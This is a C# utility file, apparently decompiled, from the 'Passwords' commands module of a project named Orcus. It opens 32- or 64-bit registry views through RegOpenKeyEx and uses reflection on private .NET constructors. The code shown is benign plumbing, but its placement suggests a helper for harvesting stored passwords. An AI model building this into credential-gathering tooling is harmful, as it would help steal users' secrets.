using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Reflection;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using Orcus.Native;
using Orcus.Utilities;

namespace Orcus.Commands.Passwords.Utilities;

internal static class RegistryExtensions
{
	[Flags]
	public enum RegistryAccessMask
	{
		QueryValue = 1,
		SetValue = 2,
		CreateSubKey = 4,
		EnumerateSubKeys = 8,
		Notify = 0x10,
		CreateLink = 0x20,
		WoW6432 = 0x200,
		Wow6464 = 0x100,
		Write = 0x20006,
		Read = 0x20019,
		Execute = 0x20019,
		AllAccess = 0xF003F
	}

	public enum RegistryView
	{
		Registry86,
		Registry64
	}

	private static readonly Dictionary<RegistryHive, UIntPtr> HiveKeys = new Dictionary<RegistryHive, UIntPtr>
	{
		{
			RegistryHive.ClassesRoot,
			new UIntPtr(2147483648u)
		},
		{
			RegistryHive.CurrentConfig,
			new UIntPtr(2147483653u)
		},
		{
			RegistryHive.CurrentUser,
			new UIntPtr(2147483649u)
		},
		{
			(RegistryHive)(-2147483642),
			new UIntPtr(2147483654u)
		},
		{
			RegistryHive.LocalMachine,
			new UIntPtr(2147483650u)
		},
		{
			RegistryHive.PerformanceData,
			new UIntPtr(2147483652u)
		},
		{
			RegistryHive.Users,
			new UIntPtr(2147483651u)
		}
	};

	private static readonly Dictionary<RegistryView, RegistryAccessMask> AccessMasks = new Dictionary<RegistryView, RegistryAccessMask>
	{
		{
			RegistryView.Registry64,
			RegistryAccessMask.Wow6464
		},
		{
			RegistryView.Registry86,
			RegistryAccessMask.WoW6432
		}
	};

	public static RegistryKey OpenBaseKey(RegistryHive registryHive, RegistryView registryType)
	{
		UIntPtr uIntPtr = HiveKeys[registryHive];
		if (CoreHelper.RunningOnVistaOrGreater)
		{
			RegistryAccessMask samDesired = RegistryAccessMask.QueryValue | RegistryAccessMask.EnumerateSubKeys | AccessMasks[registryType];
			IntPtr hkResult;
			int num = NativeMethods.RegOpenKeyEx(uIntPtr, string.Empty, 0u, (uint)samDesired, out hkResult);
			switch (num)
			{
			case 0:
			{
				Type type = typeof(SafeHandleZeroOrMinusOneIsInvalid).Assembly.GetType("Microsoft.Win32.SafeHandles.SafeRegistryHandle");
				object obj = (type.GetConstructor(BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[2]
				{
					typeof(IntPtr),
					typeof(bool)
				}, null) ?? type.GetConstructor(BindingFlags.Instance | BindingFlags.Public, null, new Type[2]
				{
					typeof(IntPtr),
					typeof(bool)
				}, null))!.Invoke(new object[2] { hkResult, true });
				ConstructorInfo constructor = typeof(RegistryKey).GetConstructor(BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[2]
				{
					type,
					typeof(bool)
				}, null);
				ConstructorInfo constructor2 = typeof(RegistryKey).GetConstructor(BindingFlags.Instance | BindingFlags.NonPublic, null, new Type[5]
				{
					typeof(IntPtr),
					typeof(bool),
					typeof(bool),
					typeof(bool),
					typeof(bool)
				}, null);
				object obj2 = (((object)constructor2 != null) ? constructor2.Invoke(new object[5]
				{
					hkResult,
					true,
					false,
					false,
					uIntPtr == HiveKeys[RegistryHive.PerformanceData]
				}) : (((object)constructor == null) ? typeof(RegistryKey).GetMethod("FromHandle", BindingFlags.Static | BindingFlags.Public, null, new Type[1] { type }, null)!.Invoke(null, new object[1] { obj }) : constructor.Invoke(new object[2] { obj, true })));
				typeof(RegistryKey).GetField("keyName", BindingFlags.Instance | BindingFlags.NonPublic)?.SetValue(obj2, string.Empty);
				return (RegistryKey)obj2;
			}
			default:
				throw new Win32Exception(num);
			case 2:
				return null;
			}
		}
		throw new PlatformNotSupportedException("The platform or operating system must be Windows 2000 or later.");
	}
}
